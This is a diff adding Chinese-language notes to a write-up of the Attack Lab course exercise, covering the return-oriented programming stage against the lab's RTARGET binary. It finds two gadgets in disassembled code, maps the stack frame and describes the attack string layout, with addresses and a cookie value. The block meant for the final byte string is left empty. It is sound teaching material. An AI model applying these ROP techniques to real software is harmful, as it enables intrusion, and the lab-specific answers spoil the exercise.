@@ -319,11 +319,49 @@ ROP 攻击策略不同于 CI 攻击，我们需要识别已存在的程序代码
 在 [attacklab.pdf](/labs/attacklab/attacklab.pdf) 的附录中，可以找到该实验所需的指令的编码，这对于识别这些 gadget 代码的作用有很大的帮助。
 
 #### Level 2
-Phase 4 我们将重复 Phase 2 的攻击，区别在于使用 gadgets 代码在 RTARGET 程序上进行相同效果的攻击。我们仅可以使用四种指令类型：movq、popq、ret、nop，以及前 8 个寄存器（%rax-%rdi）。
+Phase 4 我们将重复 Phase 2 的攻击，区别在于使用 gadgets 代码在 RTARGET 程序上进行相同效果的攻击。我们仅可以使用四种指令类型：movq、popq、ret（0xc3）、nop（0x90），以及前 8 个寄存器（%rax-%rdi）。
 
+注：实验手册中说明，所有需要的 gadgets 代码在 `start_farm` 和 `mid_farm` 之间，并且完成该 ROP 攻击只需要用到 2 个 gadget。
 
+具体的实现思路分为两步：
+1. 通过 pop 指令获取栈上存储的 cookie 值（小端序）。
+2. 通过 mov 指令将 cookie 值转移到寄存器 %rdi 中。
 
+在函数 `getval_280` 的机器代码中：
+```
+00000000004019ca <getval_280>:
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3                   	ret
+```
+发现字节序列 `58 90 c3`，等价于以下两条指令：
+```
+popq %rax
+ret
+```
 
+在函数 `addval_273` 的机器代码中：
+```
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	ret
+```
+发现字节序列 `48 89 c7 c3`，等价于以下两条指令：
+```
+movq %rax, %rdi
+ret
+```
+函数 `getbuf` 的栈帧如下表所示：
+| item | size | statements | address |
+| --- | --- | --- | --- |
+| touch2 address | 8B | gadget 2 的返回地址 | 0x5561dcb8 |
+| gadget 2 code address | 8B | gadget 1 的返回地址  | 0x5561dcb0 |
+| cookie | 8B | cookie 值0x59b997fa | 0x5561dca8 |
+| gadget 1 code address | 8B | getbuf 的返回地址 | 0x5561dca0  |
+| Buffer | 40B | 缓冲区 | 0x5561dc78 | 
 
+其中 gadget 1 代码地址为：*0x4019cc*，gadget 2 代码地址为：*0x4019a2*。因此 Phase 5 的攻击字符串字节序列为：40个任意字符+gadget 1 代码地址+cookie值+gadget 2 代码地址+touch2地址，一个可行的字节序列为：
+```
+
+```
 
 #### Level 3
